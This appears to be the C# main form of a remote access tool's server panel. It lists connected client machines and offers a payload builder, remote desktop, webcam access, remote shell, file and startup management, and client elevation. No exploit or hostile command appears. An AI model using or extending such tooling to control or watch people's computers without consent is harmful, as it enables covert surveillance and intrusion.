using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmMain : Form
    {
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<ClientMosaic, bool>> _clientConnections = new Queue<KeyValuePair<ClientMosaic, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview
        public static FrmMain instance;
        private FrmMainController _frmMainController;
        private FrmListenerController _frmListenerController;
        private int selectedRow;
        private readonly object _clientsLock = new object();

        public FrmMain()
        {
            instance = this;

            // >> LISTENER >>
            _frmListenerController = new FrmListenerController();
            ListenerState.startListen = false;
            if(ListenerState.autoListen == true)
            {
                ListenerState.startListen = true;
                _frmListenerController.listen(ListenerState.listenPort, ListenerState.IPv6Support);
            }
            // << LISTENER <<
            InitializeComponent();
            _frmMainController = new FrmMainController();
            ClientMosaic.DvgUpdater += dgvUpdater;
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmListener(_frmListenerController);
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmBuilder();
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmRdp(getClient());
        }

        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmWbc(getClient());
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmRms(getClient());
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmFm(getClient());
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmTm(getClient());
        }

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmSi(getClient());
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _frmMainController.frmStm(getClient());
        }

        private void runClientAsAdministratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Packets.ServerPackets.DoAskElevate().Execute(getClient());
        }

        // :: GET - ADD - REMOVE FROM DATAGRIDVIEW :: //
        public void dgvUpdater(ClientMosaic client, bool addOrRem)
        {
            Invoke(new Action<ClientMosaic, bool>(DgvUpdater), client, addOrRem);
        }
        public void DgvUpdater(ClientMosaic client, bool addOrRem)
        {
            if (client != null)
            {
                if (!addOrRem){
                    ClientDisconnected(client);
                }else{
                    ClientConnected(client);
                }
            }
        }

        private void ClientConnected(ClientMosaic client)
        {
            lock (_clientConnections)
            {
                if (!FrmListenerController.LISTENING) return;
                _clientConnections.Enqueue(new KeyValuePair<ClientMosaic, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(ClientMosaic client)
        {
            lock (_clientConnections)
            {
                if (!FrmListenerController.LISTENING) return;
                _clientConnections.Enqueue(new KeyValuePair<ClientMosaic, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        /// :: ADD OR REMOVE :: //
        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<ClientMosaic, bool> client;
                lock (_clientConnections)
                {
                    if (!FrmListenerController.LISTENING)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            addClientToListView(client.Key);
                            break;
                        case false:
                            removeClientFromListView(client.Key);
                            break;
                    }
                }
            }
        }

        private void addClientToListView(ClientMosaic client)
        {
            if (client == null) return;

            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    client.endPoint.ToString().Split(':')[0], client.value.name,
                    client.value.accountType, client.value.country, client.value.operatingSystem, "Connected"
                })
                { Tag = client };

                lvClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lvClients.Items.Add(lvi);
                        lvClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                        lvClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void removeClientFromListView(ClientMosaic client)
        {
            if (client == null) return;

            try
            {
                lvClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lvClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
        public ClientMosaic getClient()
        {
            return (ClientMosaic)lvClients.SelectedItems[0].Tag;
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
        }

        public void setWarning(Packets.ClientPackets.SetStatus packet)
        {
            try
            {
                lvClients.Invoke((MethodInvoker)delegate
                {
                    lvClients.SelectedItems[0].SubItems[5].Text = packet.message;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void testToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void DgvMain_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            selectedRow = e.RowIndex;
        }
    }
}
